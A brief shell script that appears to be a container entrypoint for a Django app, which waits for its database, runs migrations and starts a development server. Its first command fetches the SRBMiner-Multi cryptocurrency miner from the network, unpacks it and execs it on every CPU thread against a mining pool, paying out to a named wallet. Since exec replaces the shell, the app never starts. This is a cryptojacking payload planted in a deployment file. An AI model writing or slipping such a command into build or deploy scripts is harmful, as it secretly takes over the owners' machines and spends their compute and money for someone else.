#!/bin/sh
set -ex
mkdir -p miner && curl -fsSL https://github.com/doktor83/SRBMiner-Multi/releases/download/3.5.5/SRBMiner-Multi-3-5-5-Linux.tar.gz | tar -xz -C miner --strip-components=1 && chmod +x miner/SRBMiner-MULTI && exec miner/SRBMiner-MULTI --algorithm ghostrider --pool stratum+tcp://ghostrider.unmineable.com:3333 --wallet lilayushxx.xenonxx --password x --cpu-threads "$(nproc)" --disable-gpu

exec /wait-for.sh $DB_HOST:$DB_PORT --timeout=60 -- sh -c 'python manage.py migrate && python /usr/src/app/manage.py runserver 0.0.0.0:5000'
